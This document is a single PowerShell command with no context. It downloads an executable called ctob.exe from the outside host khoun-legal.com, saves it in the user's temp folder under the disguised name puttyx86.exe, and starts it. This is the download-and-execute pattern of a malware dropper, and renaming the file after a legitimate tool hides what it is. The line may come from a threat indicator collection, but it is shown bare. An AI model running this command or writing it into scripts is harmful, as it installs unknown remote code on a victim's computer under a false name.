
(New-Object System.Net.WebClient).DownloadFile('http://khoun-legal.com/download/ctob.exe',"$env:TEMP\puttyx86.exe");Start-Process ("$env:TEMP\puttyx86.exe")

